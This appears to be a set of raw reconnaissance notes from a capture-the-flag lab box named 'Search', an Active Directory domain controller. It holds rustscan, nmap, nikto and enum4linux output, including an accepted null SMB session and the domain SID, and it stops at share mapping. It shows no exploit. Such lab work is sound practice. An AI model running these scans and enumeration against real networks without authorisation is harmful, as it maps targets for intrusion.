Search IP:10.10.11.129

rustscan:

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
443/tcp   open  https            syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
8172/tcp  open  unknown          syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
49699/tcp open  unknown          syn-ack
49716/tcp open  unknown          syn-ack


nmap:

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-04-17 12:06:26Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-17T12:07:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
| SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack Microsoft IIS httpd 10.0
|_ssl-date: 2023-04-17T12:07:54+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
| SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
| SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-17T12:07:54+00:00; 0s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
| SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-17T12:07:54+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738614f7bc029d06d1d9ea63cdbd99e
| SHA-1: 10ae549429d61e44276fb8a224cafde9de93af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
| ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
| MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
| MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
| DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
| OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
| VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
| nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
| BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
| UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
| JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
| MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
| A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
| gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
| aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
| Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
| b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
| dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
| ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
| JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
| FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
| JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
| 7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-04-17T12:07:54+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      syn-ack Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Issuer: commonName=WMSvc-SHA2-RESEARCH
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-07T09:05:25
| Not valid after:  2030-04-05T09:05:25
| MD5:   eeb9303e6d46bd8b34a01ed60eb83287
| SHA-1: 1e069fd0ef45b05178b2c6bf1bed975ea87d0458
| -----BEGIN CERTIFICATE-----
| MIIC7TCCAdWgAwIBAgIQcJlfxrPWrqJOzFjgO04PijANBgkqhkiG9w0BAQsFADAe
| MRwwGgYDVQQDExNXTVN2Yy1TSEEyLVJFU0VBUkNIMB4XDTIwMDQwNzA5MDUyNVoX
| DTMwMDQwNTA5MDUyNVowHjEcMBoGA1UEAxMTV01TdmMtU0hBMi1SRVNFQVJDSDCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALXrSYHlRsq+HX01zrmC6Ddi
| /+vL/iDzS9endY3CRjfTjBL85qwvU5dkS+cxYTIkDaK5M9eoLcaVSARIcyrGIGuq
| DwIFQuYuaoGeQgiaQCqU5vXgsZ/xE8DRmlnZ2DeiAcHhx72TOHoUoUP4q2EqRoVr
| q5RCBGITT7hdRQd0vuTIHoLxdO2U5wZVCoN5vsp0Du43/LCgXExUpcHAHu9aVAzt
| pXWFY8B3XEFZjafffOHXiK6C2UzX4DddYweKR+ItMfQzX8T2MbX1qVm7D526/gU9
| WRGa7F/tj8+qvzZc4SQZ6Td9PWpMKCPGqqYTGmHlEW8ZowGoMSH62QaCilFxckEC
| AwEAAaMnMCUwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PBAcDBQCwAAAAMA0G
| CSqGSIb3DQEBCwUAA4IBAQAlGUrh9gLK7Er/BzEjyWebPPf18m3XxgZ13iFllhJ0
| 5tBUb3hczHIr3VOj/OWUJygxw8O10OrBZJZf29TPZ2nXKGbJRpYe+baii49LsGjr
| DiOM5XVZv5qiPBNts7fKyhpzTy0DdnIKAXUIYy/7nQ6rHetXApz89ZEzU6vAN0g0
| Zxq/NolqIVnehFn/36tjc65v1wgo6KnHAQUt6zWufueeYS3k2f4JzvFn4aPtUYRi
| nQgTuGbJTlxdVJ5DJjld9pLyJ+OctGeI1jRITiYlu5p3JwhxU0+mQjGT5mQZ+Umu
| abMpffugMOPYnyHu8poRZWjKgNBN0ygmnqGbTjx57No5
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2023-04-17T12:07:54+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title.
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2023-04-17T12:07:18
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32134/tcp): CLEAN (Timeout)
|   Check 2 (port 26934/tcp): CLEAN (Timeout)
|   Check 3 (port 18790/udp): CLEAN (Timeout)
|   Check 4 (port 45988/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required







nikto:


nikto -h 10.10.11.129
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.129
+ Target Hostname:    10.10.11.129
+ Target Port:        80
+ Start Time:         2023-04-17 15:04:14 (GMT3)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ /: Retrieved x-powered-by header: ASP.NET.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /ekkaRrI7.asmx: Retrieved x-aspnet-version header: 4.0.30319.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ 8226 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-04-17 15:14:34 (GMT3) (620 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested








enum4linux:

enum4linux  10.10.11.129
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Apr 17 15:04:28 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.11.129
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.11.129 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.11.129 )================================

Looking up status of 10.10.11.129
No reply from 10.10.11.129

 ===================================( Session Check on 10.10.11.129 )===================================


[+] Server 10.10.11.129 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.11.129 )================================

Domain Name: SEARCH
Domain Sid: S-1-5-21-271492789-1610487937-1871574529

[+] Host is part of a domain (not a workgroup)


 ===================================( OS information on 10.10.11.129 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.11.129 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.11.129 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.10.11.129 )=================================

do_connect: Connection to 10.10.11.129 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.11.129


